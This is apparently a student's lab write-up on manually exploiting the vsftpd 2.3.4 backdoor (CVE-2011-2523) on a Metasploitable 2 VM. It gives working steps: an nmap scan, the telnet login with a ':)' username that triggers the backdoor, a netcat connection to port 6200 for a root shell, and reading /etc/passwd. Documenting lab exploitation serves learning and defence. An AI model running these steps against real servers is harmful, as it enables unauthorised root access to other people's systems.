
# Manual Exploitation of vsftpd 2.3.4 on Metasploitable 2

## 📌 Overview

In this project, I manually exploited a backdoor vulnerability (CVE-2011-2523) in **vsftpd 2.3.4**, running on Metasploitable 2. The goal was to gain remote root shell access **without using Metasploit**, to understand the fundamentals of real-world vulnerabilities.

---

## 🛠 Lab Setup

| Component      | Details                                  |
|----------------|-------------------------------------------|
| Attacker VM    | Kali Linux (VirtualBox)                  |
| Target VM      | Metasploitable 2                         |
| Network Mode   | Host-Only Adapter                        |
| Tools Used     | `nmap`, `telnet`, `netcat`, `ping`       |

---

## 🔍 Exploitation Steps

### 1. Identify Metasploitable IP Address

Inside the target VM:
```bash
ifconfig
```

📸 *Screenshot: Metasploitable showing IP*

---

### 2. Ping from Kali to Confirm Connection

```bash
ping [target IP]
```

📸 *Screenshot: Successful ping*

---

### 3. Scan Open Ports with Nmap

```bash
nmap -sS -sV [target IP]
```

Result: Port **21/tcp** running `vsftpd 2.3.4`

📸 *Screenshot: Nmap result*

---

### 4. Trigger the Backdoor with Telnet

```bash
telnet [target IP] 21
```

Credentials:
```
USER test:)
PASS test
```

📸 *Screenshot: Connection closed (trigger successful)*

---

### 5. Connect to the Backdoor with Netcat

```bash
nc [target IP] 6200
```

Run post-exploit commands:
```bash
whoami
uname -a
cat /etc/passwd
```

📸 *Screenshot: Root shell access*

---

## 🧠 Lessons Learned

- Backdoors like this are rare but real — a simple `:)` in the username triggered root access.
- Manual exploitation builds a deeper understanding of networking, protocols, and how attackers think.
- Timing matters: the exploit may only work once per Metasploitable boot.
- Network config + permissions (especially with VirtualBox) were major learning points.

---

## 📸 Screenshots (Suggested)

1. Metasploitable IP
2. Ping success from Kali
3. Nmap scan results
4. Telnet trigger
5. Netcat shell
6. Root command output
7. (Optional) Custom file creation like `/root/owned.txt`

---

## ✅ Completion Checklist

| Task                          | Status |
|-------------------------------|--------|
| VM Setup                      | ✅     |
| Nmap Scanning                 | ✅     |
| Manual Exploit Triggered      | ✅     |
| Remote Root Shell Achieved    | ✅     |
| File Transfer / Documentation | ✅     |
| Writeup                       | ✅     |

---

## 🔚 Final Thoughts

This was my first hands-on manual exploitation project. No Metasploit, no automation — just raw tools and logic. I now understand what it actually means to "own" a box.
